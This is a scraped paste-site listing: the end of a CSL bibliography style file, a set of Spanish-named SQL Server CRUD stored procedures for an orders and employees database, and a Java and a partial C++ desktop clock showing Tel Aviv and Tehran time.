    <rights license=""http://creativecommons.org/licenses/by-sa/3.0/"">This work is licensed under a Creative Commons Attribution-ShareAlike 3.0 License</rights>
  </info>
  <macro name=""editor"">
    <names variable=""editor"" delimiter="", "">
      <name name-as-sort-order=""all"" and=""text"" sort-separator="", "" initialize-with="". "" delimiter="", ""/>
      <label form=""short"" prefix="" ""/>
    </names>
  </macro>
  <macro name=""author"">
    <names variable=""author"">
      <name name-as-sort-order=""all"" and=""text"" sort-separator="", "" initialize-with=""."" delimiter-precedes-last=""never"" delimiter="", ""/>
      <label form=""short"" prefix="" ""/>
      <substitute>
        <names variable=""editor""/>
        <choose>
          <if type=""article-newspaper article-magazine"" match=""any"">
            <text variable=""container-title""/>
          </if>
          <else>
            <text macro=""title""/>
          </else>
        </choose>
      </substitute>
    </names>
  </macro>
  <macro name=""author-short"">
    <names variable=""author"">
      <name form=""short"" and=""text"" delimiter="", "" et-al-min=""3"" et-al-use-first=""1"" delimiter-precedes-last=""never"" initialize-with="". ""/>
      <et-al font-style=""italic""/>
      <substitute>
        <names variable=""editor""/>
        <names variable=""translator""/>
        <choose>
          <if type=""article-newspaper article-magazine"" match=""any"">
            <text variable=""container-title"" text-case=""title"" font-style=""italic""/>
          </if>
          <else>
            <text macro=""title""/>
          </else>
        </choose>
      </substitute>
    </names>
  </macro>
  <macro name=""access"">
    <choose>
      <if variable=""URL"" match=""all"">
        <group delimiter="" "">
          <group delimiter="": "">
            <text term=""available at"" text-case=""capitalize-first""/>
            <text variable=""URL""/>
          </group>
          <group prefix=""["" suffix=""]"" delimiter="": "">
            <text term=""accessed"" text-case=""capitalize-first""/>
            <date variable=""accessed"">
              <date-part name=""day"" suffix="" ""/>
              <date-part name=""month"" suffix="" ""/>
              <date-part name=""year""/>
            </date>
          </group>
        </group>
      </if>
      <else-if match=""all"" variable=""DOI"">
        <text variable=""DOI"" prefix=""doi: ""/>
      </else-if>
    </choose>
  </macro>
  <macro name=""title"">
    <choose>
      <if type=""bill book graphic legal_case legislation motion_picture report song thesis patent post post-weblog webpage"" match=""any"">
        <text variable=""title"" font-style=""italic""/>
      </if>
      <else>
        <text variable=""title"" suffix="".""/>
      </else>
    </choose>
  </macro>
  <macro name=""publisher"">
    <group delimiter="": "" suffix="""">
      <text variable=""publisher-place""/>
      <text variable=""publisher""/>
    </group>
  </macro>
  <macro name=""year-date"">
    <choose>
      <if variable=""issued"">
        <date variable=""issued"">
          <date-part name=""year""/>
        </date>
        <text variable=""year-suffix""/>
      </if>
      <else>
        <text term=""no date"" prefix=""["" suffix=""]""/>
        <text variable=""year-suffix"" prefix=""["" suffix=""]""/>
      </else>
    </choose>
  </macro>
  <macro name=""published-date"">
    <choose>
      <if type=""article-newspaper article-magazine speech"" match=""any"">
        <date variable=""issued"">
          <date-part name=""day"" prefix="" "" suffix="" ""/>
          <date-part name=""month"" form=""long""/>
        </date>
      </if>
    </choose>
  </macro>
  <macro name=""edition"">
    <choose>
      <if is-numeric=""edition"">
        <group delimiter="" "">
          <number variable=""edition"" form=""ordinal""/>
          <text term=""edition"" form=""short""/>
        </group>
      </if>
      <else>
        <text variable=""edition"" suffix="".""/>
      </else>
    </choose>
  </macro>
  <macro name=""pages"">
    <group>
      <label variable=""page"" form=""short"" suffix="" ""/>
      <text variable=""page""/>
    </group>
    <choose>
      <if type=""article article-journal article-magazine article-newspaper book review review-book report"" match=""any""/>
    </choose>
  </macro>
  <macro name=""bill-detail"">
    <choose>
      <if type=""bill legislation"" match=""any"">
        <group>
          <text variable=""section""/>
          <text variable=""volume""/>
        </group>
      </if>
    </choose>
  </macro>
  <macro name=""patent"">
    <text variable=""number"" suffix="" [Patent].""/>
  </macro>
  <citation et-al-min=""3"" et-al-use-first=""1"" et-al-subsequent-min=""3"" et-al-subsequent-use-first=""1"" disambiguate-add-year-suffix=""true"">
    <sort>
      <key macro=""year-date""/>
      <key variable=""author""/>
    </sort>
    <layout prefix=""("" suffix="")"" delimiter=""; "">
      <group delimiter="", "">
        <group delimiter="", "">
          <text macro=""author-short""/>
          <text macro=""year-date""/>
        </group>
        <group>
          <label variable=""locator"" form=""short""/>
          <text variable=""locator""/>
        </group>
      </group>
    </layout>
  </citation>
  <bibliography et-al-min=""50"" et-al-use-first=""1"" hanging-indent=""false"">
    <sort>
      <key macro=""author""/>
      <key macro=""year-date""/>
      <key variable=""title""/>
    </sort>
    <layout>
      <group delimiter="". "">
        <text macro=""author""/>
        <text macro=""year-date""/>
        <choose>
          <if type=""bill book graphic legal_case legislation motion_picture report song entry-encyclopedia entry-dictionary"" match=""any"">
            <group delimiter="". "" suffix=""."">
              <text macro=""title""/>
              <text macro=""edition""/>
              <text macro=""editor""/>
              <text macro=""publisher""/>
              <text macro=""bill-detail""/>
              <text macro=""pages""/>
            </group>
          </if>
          <else-if type=""chapter paper-conference"" match=""any"">
            <group delimiter="". "" suffix=""."">
              <text macro=""title""/>
              <group prefix="" "" delimiter="" "">
                <text term=""in"" text-case=""capitalize-first"" suffix="":""/>
                <text macro=""editor""/>
                <text variable=""container-title"" font-style=""italic"" suffix="".""/>
                <text variable=""collection-title"" suffix="".""/>
              </group>
              <group prefix="" "" delimiter="" "">
                <text macro=""edition""/>
                <group suffix="""" delimiter="", "">
                  <date form=""text"" variable=""event-date""/>
                  <text macro=""publisher""/>
                  <text macro=""pages""/>
                </group>
              </group>
            </group>
          </else-if>
          <else-if type=""thesis"">
            <group delimiter="". "" suffix=""."">
              <text macro=""title""/>
              <text macro=""edition""/>
              <group prefix="" "" delimiter="", "">
                <text variable=""genre""/>
                <text macro=""publisher""/>
              </group>
            </group>
          </else-if>
          <else-if type=""webpage post post-weblog"" match=""any"">
            <group delimiter="". "" suffix=""."">
              <text macro=""title""/>
            </group>
          </else-if>
          <else-if type=""patent"" match=""any"">
            <group delimiter="" "" suffix=""."">
              <text macro=""title""/>
              <text macro=""patent""/>
            </group>
          </else-if>
          <else>
            <group delimiter="". "" suffix=""."">
              <group>
                <text macro=""title""/>
                <text macro=""editor"" prefix="" ""/>
              </group>
              <group delimiter="", "">
                <group delimiter="" "">
                  <text variable=""container-title"" font-style=""italic""/>
                  <group>
                    <text variable=""volume""/>
                    <text variable=""issue"" prefix=""("" suffix="")""/>
                  </group>
                </group>
                <text macro=""pages""/>
              </group>
            </group>
          </else>
        </choose>
      </group>
      <group suffix=""."">
        <text macro=""published-date""/>
        <text prefix="". "" macro=""access"" suffix="".""/>
      </group>
    </layout>
  </bibliography>
</style>
"
TbYazYQ9,TABLA DEPARTAMENTO [SSMS],Diego1764,MySQL,Monday 16th of June 2025 10:21:21 PM CDT,"-- TABLA DEPARTAMENTO
CREATE PROCEDURE inserta_departamento
    @codi_depa int,
    @nombre nvarchar(30)
AS
BEGIN
    INSERT INTO DEPARTAMENTO (codi_depa, nombre)
    VALUES (@codi_depa, @nombre)
END
-- *******************************************************
CREATE PROCEDURE actualiza_departamento
    @codi_depa int,
    @nombre nvarchar(30)
AS
BEGIN
    UPDATE DEPARTAMENTO
    SET nombre = @nombre
    WHERE codi_depa = @codi_depa
END
-- *******************************************************
CREATE PROCEDURE elimina_departamento
    @codi_depa int
AS
BEGIN
    DELETE FROM DEPARTAMENTO
    WHERE codi_depa = @codi_depa
END
-- *******************************************************
CREATE PROCEDURE consulta_departamento
    @codi_depa int,
    @nombre nvarchar(30) OUTPUT
AS
BEGIN
    SELECT @nombre = nombre
    FROM DEPARTAMENTO
    WHERE codi_depa = @codi_depa
END"
BSqeGPHC,TABLA CARGO INTERNACIONAL [SSMS],Diego1764,MySQL,Monday 16th of June 2025 10:20:05 PM CDT,"-- TABLA CARGO INTERNACIONAL
CREATE PROCEDURE inserta_cargo_internacional
    @codi_carg int,
    @descripcion nvarchar(40)
AS
BEGIN
    INSERT INTO CARGO_INTERNACIONAL (codi_carg, descripcion)
    VALUES (@codi_carg, @descripcion)
END
-- *******************************************************
CREATE PROCEDURE actualiza_cargo_internacional
    @codi_carg int,
    @descripcion nvarchar(40)
AS
BEGIN
    UPDATE CARGO_INTERNACIONAL
    SET descripcion = @descripcion
    WHERE codi_carg = @codi_carg
END
-- *******************************************************
CREATE PROCEDURE elimina_cargo_internacional
    @codi_carg int
AS
BEGIN
    DELETE FROM CARGO_INTERNACIONAL
    WHERE codi_carg = @codi_carg
END
-- *******************************************************
CREATE PROCEDURE consulta_cargo_internacional
    @codi_carg int,
    @descripcion nvarchar(40) OUTPUT
AS
BEGIN
    SELECT @descripcion = descripcion
    FROM CARGO_INTERNACIONAL
    WHERE codi_carg = @codi_carg
END"
UKENUriX,TABLA ORDEN [SSMS],Diego1764,MySQL,Monday 16th of June 2025 10:18:36 PM CDT,"-- TABLA ORDEN
CREATE PROCEDURE inserta_orden
    @codi_orde int,
    @codi_clie int,
    @codi_empl int,
    @fecha_orde datetime,
    @fecha_envi datetime,
    @fecha_desp datetime,
    @direccion nvarchar(60),
    @ciudad nvarchar(15),
    @region nvarchar(15),
    @cod_postal nvarchar(10),
    @pais nvarchar(15)
AS
BEGIN
    INSERT INTO ORDEN (codi_orde, codi_clie, codi_empl, fecha_orde, fecha_envi, fecha_desp,
                       direccion, ciudad, region, cod_postal, pais)
    VALUES (@codi_orde, @codi_clie, @codi_empl, @fecha_orde, @fecha_envi, @fecha_desp,
            @direccion, @ciudad, @region, @cod_postal, @pais)
END
-- *******************************************************
CREATE PROCEDURE actualiza_orden
    @codi_orde int,
    @codi_clie int,
    @codi_empl int,
    @fecha_orde datetime,
    @fecha_envi datetime,
    @fecha_desp datetime,
    @direccion nvarchar(60),
    @ciudad nvarchar(15),
    @region nvarchar(15),
    @cod_postal nvarchar(10),
    @pais nvarchar(15)
AS
BEGIN
    UPDATE ORDEN
    SET 
        codi_clie = @codi_clie,
        codi_empl = @codi_empl,
        fecha_orde = @fecha_orde,
        fecha_envi = @fecha_envi,
        fecha_desp = @fecha_desp,
        direccion = @direccion,
        ciudad = @ciudad,
        region = @region,
        cod_postal = @cod_postal,
        pais = @pais
    WHERE codi_orde = @codi_orde
END
-- *******************************************************
CREATE PROCEDURE elimina_orden
    @codi_orde int
AS
BEGIN
    DELETE FROM ORDEN
    WHERE codi_orde = @codi_orde
END
-- *******************************************************
CREATE PROCEDURE consulta_orden
    @codi_orde int,
    @codi_clie int OUTPUT,
    @codi_empl int OUTPUT,
    @fecha_orde datetime OUTPUT,
    @fecha_envi datetime OUTPUT,
    @fecha_desp datetime OUTPUT,
    @direccion nvarchar(60) OUTPUT,
    @ciudad nvarchar(15) OUTPUT,
    @region nvarchar(15) OUTPUT,
    @cod_postal nvarchar(10) OUTPUT,
    @pais nvarchar(15) OUTPUT
AS
BEGIN
    SELECT 
        @codi_clie = codi_clie,
        @codi_empl = codi_empl,
        @fecha_orde = fecha_orde,
        @fecha_envi = fecha_envi,
        @fecha_desp = fecha_desp,
        @direccion = direccion,
        @ciudad = ciudad,
        @region = region,
        @cod_postal = cod_postal,
        @pais = pais
    FROM ORDEN
    WHERE codi_orde = @codi_orde
END"
T8a3xJuN,TABLA DETALLE ORDEN [SSMS],Diego1764,MySQL,Monday 16th of June 2025 10:17:06 PM CDT,"-- TABLA DETALLE ORDEN
CREATE PROCEDURE inserta_detalle_orden
    @codi_orde int,
    @codi_prod int,
    @preciouni money,
    @cantidad smallint,
    @descue real
AS
BEGIN
    INSERT INTO DETALLE_ORDEN (codi_orde, codi_prod, preciouni, cantidad, descue)
    VALUES (@codi_orde, @codi_prod, @preciouni, @cantidad, @descue)
END
-- *******************************************************
CREATE PROCEDURE actualiza_detalle_orden
    @codi_orde int,
    @codi_prod int,
    @preciouni money,
    @cantidad smallint,
    @descue real
AS
BEGIN
    UPDATE DETALLE_ORDEN
    SET 
        preciouni = @preciouni,
        cantidad = @cantidad,
        descue = @descue
    WHERE codi_orde = @codi_orde AND codi_prod = @codi_prod
END
-- *******************************************************
CREATE PROCEDURE elimina_detalle_orden
    @codi_orde int,
    @codi_prod int
AS
BEGIN
    DELETE FROM DETALLE_ORDEN
    WHERE codi_orde = @codi_orde AND codi_prod = @codi_prod
END
-- *******************************************************
CREATE PROCEDURE consulta_detalle_orden
    @codi_orde int,
    @codi_prod int,
    @preciouni money OUTPUT,
    @cantidad smallint OUTPUT,
    @descue real OUTPUT
AS
BEGIN
    SELECT 
        @preciouni = preciouni,
        @cantidad = cantidad,
        @descue = descue
    FROM DETALLE_ORDEN
    WHERE codi_orde = @codi_orde AND codi_prod = @codi_prod
END"
C4ni1QcS,TABLA CATEGORIA [SSMS],Diego1764,MySQL,Monday 16th of June 2025 10:15:36 PM CDT,"-- TABLA CATEGORIA
CREATE PROCEDURE inserta_categoria
    @codi_cate int,
    @nombre nvarchar(15),
    @descripcion nvarchar(20)
AS
BEGIN
    INSERT INTO CATEGORIA (codi_cate, nombre, descripcion)
    VALUES (@codi_cate, @nombre, @descripcion)
END
-- *******************************************************
CREATE PROCEDURE actualiza_categoria
    @codi_cate int,
    @nombre nvarchar(15),
    @descripcion nvarchar(20)
AS
BEGIN
    UPDATE CATEGORIA
    SET 
        nombre = @nombre,
        descripcion = @descripcion
    WHERE codi_cate = @codi_cate
END
-- *******************************************************
CREATE PROCEDURE elimina_categoria
    @codi_cate int
AS
BEGIN
    DELETE FROM CATEGORIA
    WHERE codi_cate = @codi_cate
END
-- *******************************************************
CREATE PROCEDURE consulta_categoria
    @codi_cate int,
    @nombre nvarchar(15) OUTPUT,
    @descripcion nvarchar(20) OUTPUT
AS
BEGIN
    SELECT 
        @nombre = nombre,
        @descripcion = descripcion
    FROM CATEGORIA
    WHERE codi_cate = @codi_cate
END"
h8uddTw8,TABLA PRODUCTO [SSMS],Diego1764,MySQL,Monday 16th of June 2025 10:11:12 PM CDT,"-- TABLA PRODUCTO
CREATE PROCEDURE inserta_producto
    @codi_prod int,
    @nombre nvarchar(40),
    @codi_prov int,
    @codi_cate int,
    @cant_unid nvarchar(20),
    @prec_unit money,
    @existencia char(10),
    @unid_orde char(10),
    @descontinuado bit
AS
BEGIN
    INSERT INTO PRODUCTO (codi_prod, nombre, codi_prov, codi_cate, cant_unid, prec_unit, existencia, unid_orde, descontinuado)
    VALUES (@codi_prod, @nombre, @codi_prov, @codi_cate, @cant_unid, @prec_unit, @existencia, @unid_orde, @descontinuado)
END
-- *******************************************************
CREATE PROCEDURE actualiza_producto
    @codi_prod int,
    @nombre nvarchar(40),
    @codi_prov int,
    @codi_cate int,
    @cant_unid nvarchar(20),
    @prec_unit money,
    @existencia char(10),
    @unid_orde char(10),
    @descontinuado bit
AS
BEGIN
    UPDATE PRODUCTO
    SET 
        nombre = @nombre,
        codi_prov = @codi_prov,
        codi_cate = @codi_cate,
        cant_unid = @cant_unid,
        prec_unit = @prec_unit,
        existencia = @existencia,
        unid_orde = @unid_orde,
        descontinuado = @descontinuado
    WHERE codi_prod = @codi_prod
END
-- *******************************************************
CREATE PROCEDURE elimina_producto
    @codi_prod int
AS
BEGIN
    DELETE FROM PRODUCTO
    WHERE codi_prod = @codi_prod
END
-- *******************************************************
CREATE PROCEDURE consulta_producto
    @codi_prod int,
    @nombre nvarchar(40) OUTPUT,
    @codi_prov int OUTPUT,
    @codi_cate int OUTPUT,
    @cant_unid nvarchar(20) OUTPUT,
    @prec_unit money OUTPUT,
    @existencia char(10) OUTPUT,
    @unid_orde char(10) OUTPUT,
    @descontinuado bit OUTPUT
AS
BEGIN
    SELECT 
        @nombre = nombre,
        @codi_prov = codi_prov,
        @codi_cate = codi_cate,
        @cant_unid = cant_unid,
        @prec_unit = prec_unit,
        @existencia = existencia,
        @unid_orde = unid_orde,
        @descontinuado = descontinuado
    FROM PRODUCTO
    WHERE codi_prod = @codi_prod
END"
3svRsUBU,TABLA EMPLEADO [SSMS],Diego1764,MySQL,Monday 16th of June 2025 10:09:33 PM CDT,"-- TABLA EMPLEADO
CREATE PROCEDURE inserta_empleado
    @codi_empl int,
    @nombre nvarchar(30),
    @apellido nvarchar(30),
    @cargo_trabajo nvarchar(30),
    @titulo nvarchar(30),
    @fecha_nacimiento datetime,
    @fecha_ingreso datetime,
    @direccion nvarchar(60),
    @ciudad nvarchar(15),
    @region nvarchar(15),
    @codigo_postal nvarchar(10),
    @pais nvarchar(15),
    @telefono nvarchar(20),
    @foto image,
    @reporta_a int,
    @codi_depa int
AS
BEGIN
    INSERT INTO EMPLEADO (codi_empl, nombre, apellido, cargo_trabajo, titulo, fecha_nacimiento, fecha_ingreso,
                          direccion, ciudad, region, codigo_postal, pais, telefono, foto, reporta_a, codi_depa)
    VALUES (@codi_empl, @nombre, @apellido, @cargo_trabajo, @titulo, @fecha_nacimiento, @fecha_ingreso,
            @direccion, @ciudad, @region, @codigo_postal, @pais, @telefono, @foto, @reporta_a, @codi_depa)
END
-- *******************************************************
CREATE PROCEDURE actualiza_empleado
    @codi_empl int,
    @nombre nvarchar(30),
    @apellido nvarchar(30),
    @cargo_trabajo nvarchar(30),
    @titulo nvarchar(30),
    @fecha_nacimiento datetime,
    @fecha_ingreso datetime,
    @direccion nvarchar(60),
    @ciudad nvarchar(15),
    @region nvarchar(15),
    @codigo_postal nvarchar(10),
    @pais nvarchar(15),
    @telefono nvarchar(20),
    @foto image,
    @reporta_a int,
    @codi_depa int
AS
BEGIN
    UPDATE EMPLEADO
    SET 
        nombre = @nombre,
        apellido = @apellido,
        cargo_trabajo = @cargo_trabajo,
        titulo = @titulo,
        fecha_nacimiento = @fecha_nacimiento,
        fecha_ingreso = @fecha_ingreso,
        direccion = @direccion,
        ciudad = @ciudad,
        region = @region,
        codigo_postal = @codigo_postal,
        pais = @pais,
        telefono = @telefono,
        foto = @foto,
        reporta_a = @reporta_a,
        codi_depa = @codi_depa
    WHERE codi_empl = @codi_empl
END
-- *******************************************************
CREATE PROCEDURE elimina_empleado
    @codi_empl int
AS
BEGIN
    DELETE FROM EMPLEADO
    WHERE codi_empl = @codi_empl
END
-- *******************************************************
CREATE PROCEDURE consulta_empleado
    @codi_empl int,
    @nombre nvarchar(30) OUTPUT,
    @apellido nvarchar(30) OUTPUT,
    @cargo_trabajo nvarchar(30) OUTPUT,
    @titulo nvarchar(30) OUTPUT,
    @fecha_nacimiento datetime OUTPUT,
    @fecha_ingreso datetime OUTPUT,
    @direccion nvarchar(60) OUTPUT,
    @ciudad nvarchar(15) OUTPUT,
    @region nvarchar(15) OUTPUT,
    @codigo_postal nvarchar(10) OUTPUT,
    @pais nvarchar(15) OUTPUT,
    @telefono nvarchar(20) OUTPUT,
    @foto image OUTPUT,
    @reporta_a int OUTPUT,
    @codi_depa int OUTPUT
AS
BEGIN
    SELECT 
        @nombre = nombre,
        @apellido = apellido,
        @cargo_trabajo = cargo_trabajo,
        @titulo = titulo,
        @fecha_nacimiento = fecha_nacimiento,
        @fecha_ingreso = fecha_ingreso,
        @direccion = direccion,
        @ciudad = ciudad,
        @region = region,
        @codigo_postal = codigo_postal,
        @pais = pais,
        @telefono = telefono,
        @foto = foto,
        @reporta_a = reporta_a,
        @codi_depa = codi_depa
    FROM EMPLEADO
    WHERE codi_empl = @codi_empl
END"
jTe4CGiu,TABLA CLIENTE [SSMS],Diego1764,MySQL,Monday 16th of June 2025 10:06:03 PM CDT,"-- TABLA CLIENTE
CREATE PROCEDURE inserta_cliente
    @codi_clie nchar(5),
    @nomb_empr nvarchar(30),
    @contacto nvarchar(30),
    @cargo_contacto nvarchar(30),
    @direccion nvarchar(60),
    @ciudad nvarchar(15),
    @codigo_postal nvarchar(10),
    @pais nvarchar(15),
    @telefono nvarchar(12),
    @fax nvarchar(12)
AS
BEGIN
    INSERT INTO CLIENTE(codi_clie, nomb_empr, contacto, cargo_contacto, direccion, ciudad, codigo_postal, pais, telefono, fax)
    VALUES(@codi_clie, @nomb_empr, @contacto, @cargo_contacto, @direccion, @ciudad, @codigo_postal, @pais, @telefono, @fax)
END
-- *******************************************************
CREATE PROCEDURE actualiza_cliente
    @codi_clie nchar(5),
    @nomb_empr nvarchar(30),
    @contacto nvarchar(30),
    @cargo_contacto nvarchar(30),
    @direccion nvarchar(60),
    @ciudad nvarchar(15),
    @codigo_postal nvarchar(10),
    @pais nvarchar(15),
    @telefono nvarchar(12),
    @fax nvarchar(12)
AS
BEGIN
    UPDATE CLIENTE
    SET 
        nomb_empr = @nomb_empr,
        contacto = @contacto,
        cargo_contacto = @cargo_contacto,
        direccion = @direccion,
        ciudad = @ciudad,
        codigo_postal = @codigo_postal,
        pais = @pais,
        telefono = @telefono,
        fax = @fax
    WHERE codi_clie = @codi_clie
END
-- *******************************************************
CREATE PROCEDURE elimina_cliente
    @codi_clie nchar(5)
AS
BEGIN
    DELETE FROM CLIENTE
    WHERE codi_clie = @codi_clie
END
-- *******************************************************
CREATE PROCEDURE consulta_cliente
    @codi_clie nchar(5),
    @nomb_empr nvarchar(30) OUTPUT,
    @contacto nvarchar(30) OUTPUT,
    @cargo_contacto nvarchar(30) OUTPUT,
    @direccion nvarchar(60) OUTPUT,
    @ciudad nvarchar(15) OUTPUT,
    @codigo_postal nvarchar(10) OUTPUT,
    @pais nvarchar(15) OUTPUT,
    @telefono nvarchar(12) OUTPUT,
    @fax nvarchar(12) OUTPUT
AS
BEGIN
    SELECT 
        @nomb_empr = nomb_empr,
        @contacto = contacto,
        @cargo_contacto = cargo_contacto,
        @direccion = direccion,
        @ciudad = ciudad,
        @codigo_postal = codigo_postal,
        @pais = pais,
        @telefono = telefono,
        @fax = fax
    FROM CLIENTE
    WHERE codi_clie = @codi_clie
END"
4FuT3AAe,TABLA PROVEEDOR [SSMS],Diego1764,MySQL,Monday 16th of June 2025 10:02:51 PM CDT,"-- TABLA PROVEEDOR
CREATE PROCEDURE inserta_proveedor
    -- @codi_prov int,
    @nomb_empr nvarchar(40),
    @nomb_conta nvarchar(30),
    @carg_conta nvarchar(30),
    @direccion nvarchar(40),
    @cuidad nvarchar (15),
    @pais nvarchar (15),
    @telefono nvarchar (12),
    @fax nvarchar(12)
AS
BEGIN
    DECLARE @ln_codi_prov int;

    SELECT @ln_codi_prov = ISNULL(MAX(codi_prov), 0) + 1 
    FROM PROVEEDOR;

    INSERT INTO PROVEEDOR([codi_prov], [nomb_empr], [nomb_conta], [carg_conta], [direccion], [ciudad], [pais], [telefono], [fax])
    VALUES(@ln_codi_prov, @nomb_empr, @nomb_conta, @carg_conta, @direccion, @cuidad, @pais, @telefono, @fax)
END
-- *******************************************************
CREATE PROCEDURE elimina_proveedor
    @codi_prov int
AS
BEGIN
    DELETE 
    FROM PROVEEDOR
    WHERE codi_prov = @codi_prov
END
-- *******************************************************
CREATE PROCEDURE consulta_proveedor
    @codi_prov INT,
    @nomb_empr nvarchar(40) OUTPUT,
    @nomb_conta nvarchar(30) OUTPUT,
    @carg_conta nvarchar(30) OUTPUT,
    @direccion nvarchar(40) OUTPUT,
    @cuidad nvarchar(15) OUTPUT,
    @pais nvarchar(15) OUTPUT,
    @telefono nvarchar(12) OUTPUT,
    @fax nvarchar(12) OUTPUT
AS
BEGIN
    SELECT 
        @nomb_empr = nomb_empr,
        @nomb_conta = nomb_conta,
        @carg_conta = carg_conta,
        @direccion = direccion,
        @cuidad = ciudad,
        @pais = pais,
        @telefono = telefono,
        @fax = fax
    FROM PROVEEDOR
    WHERE codi_prov = @codi_prov
END
-- *******************************************************
CREATE PROCEDURE actualiza_proveedor
    @codi_prov int,
    @nomb_empr nvarchar(40),
    @nomb_conta nvarchar(30),
    @carg_conta nvarchar(30),
    @direccion nvarchar(40),
    @cuidad nvarchar(15),
    @pais nvarchar(15),
    @telefono nvarchar(12),
    @fax nvarchar(12)
AS
BEGIN
    UPDATE PROVEEDOR
    SET 
        nomb_empr = @nomb_empr,
        nomb_conta = @nomb_conta,
        carg_conta = @carg_conta,
        direccion = @direccion,
        ciudad = @cuidad,
        pais = @pais,
        telefono = @telefono,
        fax = @fax
    WHERE codi_prov = @codi_prov
END"
QrvfsXea,Untitled,pwtenny,Java,Monday 16th of June 2025 07:47:55 PM CDT,"import javax.swing.*;
import java.awt.*;
import java.time.ZonedDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import javax.swing.border.EmptyBorder;

public class TimeDisplayApp extends JFrame {

    private JLabel telAvivTimeLabel;
    private JLabel tehranTimeLabel;

    public TimeDisplayApp() {
        // Set the native Windows look and feel
        try {
            UIManager.setLookAndFeel(""com.sun.java.swing.plaf.windows.WindowsLookAndFeel"");
        }
        catch (ClassNotFoundException | InstantiationException | IllegalAccessException | UnsupportedLookAndFeelException e) {
            e.printStackTrace();
            // Fallback to default if Windows look and feel is not available
        }

        setTitle(""World Clocks"");
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setSize(300, 150);
        setLocationRelativeTo(null); // Center the window

        // Create a panel with a GridLayout for the labels
        JPanel panel = new JPanel(new GridLayout(2, 1));
        panel.setBorder(new EmptyBorder(10, 10, 10, 10)); // Add some padding

        telAvivTimeLabel = new JLabel();
        tehranTimeLabel = new JLabel();

        // Set font for better readability
        Font font = new Font(""SansSerif"", Font.BOLD, 24);
        telAvivTimeLabel.setFont(font);
        tehranTimeLabel.setFont(font);

        // Center the text in the labels
        telAvivTimeLabel.setHorizontalAlignment(SwingConstants.CENTER);
        tehranTimeLabel.setHorizontalAlignment(SwingConstants.CENTER);

        panel.add(telAvivTimeLabel);
        panel.add(tehranTimeLabel);

        add(panel);

        // Timer to update the time every second
        Timer timer = new Timer(1000, e -> updateTimes());
        timer.start();

        // Initial update
        updateTimes();
    }

    private void updateTimes() {
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern(""hh:mm:ss a"");

        // Tel Aviv time
        ZoneId telAvivZone = ZoneId.of(""Asia/Jerusalem"");
        ZonedDateTime telAvivDateTime = ZonedDateTime.now(telAvivZone);
        telAvivTimeLabel.setText(""Tel Aviv: "" + telAvivDateTime.format(formatter));

        // Tehran time
        ZoneId tehranZone = ZoneId.of(""Asia/Tehran"");
        ZonedDateTime tehranDateTime = ZonedDateTime.now(tehranZone);
        tehranTimeLabel.setText(""Tehran: "" + tehranDateTime.format(formatter));
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> {
            new TimeDisplayApp().setVisible(true);
        });
    }
}"
MaWSLKaz,Untitled,pwtenny,C++,Monday 16th of June 2025 07:47:25 PM CDT,"#include <windows.h> // Required for Windows API
#include <string>      // For std::string
#include <chrono>      // For time operations
#include <thread>      // For std::this_thread::sleep_for
#include <ctime>       // For time_t, tm, gmtime
#include <iomanip>     // For std::put_time

// Global handles for the time labels
HWND hTelAvivTimeLabel;
HWND hTehranTimeLabel;

// Window procedure function (callback for window messages)
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
        case WM_CREATE:
        {
            // Create static text controls (labels)
            hTelAvivTimeLabel = CreateWindowEx(
                0, ""STATIC"", ""Tel Aviv: Loading..."",
                WS_CHILD | WS_VISIBLE | SS_CENTER,
                10, 10, 260, 30, // x, y, width, height
                hwnd, (HMENU)1001, GetModuleHandle(NULL), NULL);

            hTehranTimeLabel = CreateWindowEx(
                0, ""STATIC"", ""Tehran: Loading..."",
                WS_CHILD | WS_VISIBLE | SS_CENTER,
                10, 50, 260, 30, // x, y, width, height
                hwnd, (HMENU)1002, GetModuleHandle(NULL), NULL);

            // Set font for better readability
            HFONT hFont = CreateFont(
                24, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, ""SansSerif"");

            SendMessage(hTelAvivTimeLabel, WM_SETFONT, (WPARAM)hFont, TRUE);
            SendMessage(hTehranTimeLabel, WM_SETFONT, (WPARAM)hFont, TRUE);

            break;
        }
        case WM_TIMER:
        {
            if (wParam == 1) // Our timer ID
            {
                // Update times
                SYSTEMTIME stLocal;
                GetLocalTime(&stLocal); // Get local time

                // Tel Aviv (GMT+3 or GMT+2 depending on DST, assuming GMT+3 for simplicity,
                // you'd need a more robust time zone library for exact DST handling)
                // For simplicity, we'll assume a fixed offset.
                // A robust solution would use a library like Howard Hinnant's date library or ICU.
                // For this example, we'll calculate approximate offsets.

                // Get current UTC time
                SYSTEMTIME stUTC;
                GetSystemTime(&stUTC);

                // Convert SYSTEMTIME to file time for easier arithmetic
                FILETIME ftUTC, ftTelAviv, ftTehran;
                SystemTimeToFileTime(&stUTC, &ftUTC);

                // Define time zone offsets in 100-nanosecond intervals (1 hour = 3600 * 10^7 = 36,000,000,000)
                // Tel Aviv: UTC+3 (during summer), UTC+2 (during winter) - Let's use a fixed +3 for this example.
                // Tehran: UTC+3:30

                // For simplicity and without a complex timezone library, we'll rely on
                // getting UTC time and applying a fixed offset.
                // The correct way would involve Windows API functions like TzSpecificLocalTimeToSystemTime
                // or a comprehensive timezone library.

                // Using standard C++ time functions for simplicity, which requires knowing the current offset from UTC.
                // A better solution for real-world applications would be to use a robust date/time library
                // that handles time zones and DST correctly (e.g., ICU, or Howard Hinnant's date library).

                // Let's approximate by getting current local time and adjusting.
                // This is a simplification and not perfectly accurate for all timezone/DST scenarios.

                // For a truly accurate solution for time zones in C++, you would need
                // to use a dedicated library like Howard Hinnant's ""date"" library or ICU.
                // The Windows API itself has functions for time zone conversion, but they are
                // more involved than a simple offset.

                // For this example, we'll demonstrate using `_tzset` and `_ftime_s` for basic timezone awareness,
                // but this is highly platform-specific (Microsoft Visual C++ runtime).
                // A portable C++ solution would use `std::chrono` and a timezone library.

                // Let's use `std::chrono` for basic time, but truly complex timezones are hard without a library.
                auto now = std::chrono::system_clock::now();

                // Tel Aviv: Approx UTC+3:00 (Israel Standard Time / Israel Daylight Time)
